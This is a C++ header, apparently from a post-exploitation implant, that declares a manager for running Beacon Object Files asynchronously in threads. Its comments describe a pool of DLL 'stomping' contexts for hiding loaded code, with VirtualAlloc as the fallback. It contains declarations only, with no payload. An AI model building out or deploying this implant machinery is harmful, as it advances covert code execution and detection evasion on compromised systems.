#pragma once

#include "std.cpp"
#include "Packer.h"
#include "ApiLoader.h"
#include "bof_loader.h"
#include "config.h"

#define ASYNC_BOF_STATE_PENDING   0x0
#define ASYNC_BOF_STATE_RUNNING   0x1
#define ASYNC_BOF_STATE_FINISHED  0x2
#define ASYNC_BOF_STATE_STOPPED   0x3

#define ASYNC_BOF_OUTPUT_BUFFER_SIZE 0x10000

struct AsyncBofContext {
    ULONG   taskId;
    ULONG   state;
    HANDLE  hThread;
    DWORD   threadId;
    HANDLE  hStopEvent;

    BYTE*   coffFile;
    ULONG   coffFileSize;
    BYTE*   args;
    ULONG   argsSize;
    CHAR*   entryName;

    CRITICAL_SECTION outputLock;
    Packer* outputBuffer;

    PCHAR          mapSections[25];
    LPVOID         mapFunctions;

    BOF_STOMP_CTX* stompCtx;
};

extern __declspec(thread) AsyncBofContext* tls_CurrentBofContext;

#define BOF_STOMP_POOL_MAX 32

struct StompSlot {
    BOF_STOMP_CTX* ctx;       // NULL = slot libre
    BOOL           inUse;
};

class Boffer
{
public:
    Vector<AsyncBofContext*> asyncBofs;

    HANDLE  wakeupEvent;
    CRITICAL_SECTION managerLock;

    // Pool de BOF_STOMP_CTX* para BOFs asíncronos.
    // Cada slot se inicializa en Initialize() con una DLL distinta del pool.
    // AcquireStompSlot() toma uno libre; ReleaseStompSlot() lo libera.
    // Si no hay slots libres, devuelve NULL → AsyncBofThreadProc cae a VirtualAlloc.
    StompSlot        stompPool[BOF_STOMP_POOL_MAX];
    int              stompPoolSize;
    CRITICAL_SECTION stompPoolLock;

    BOF_STOMP_CTX* AcquireStompSlot();
    void           ReleaseStompSlot(BOF_STOMP_CTX* ctx);

    Boffer();
    ~Boffer();

    BOOL Initialize();

    AsyncBofContext* CreateAsyncBof(ULONG taskId, CHAR* entryName, BYTE* coffFile,
                                    ULONG coffFileSize, BYTE* args, ULONG argsSize);

    BOOL StartAsyncBof(AsyncBofContext* ctx);
    BOOL StopAsyncBof(ULONG taskId);

    void ProcessAsyncBofs(Packer* outPacker);
    void CleanupFinishedBofs();

    AsyncBofContext* FindBofByThreadId(DWORD threadId);

    HANDLE GetWakeupEvent();

    void SignalWakeup();

    static void* operator new(size_t sz);
    static void operator delete(void* p) noexcept;

private:
    void CleanupBofContext(AsyncBofContext* ctx);
};

extern Boffer* g_AsyncBofManager;
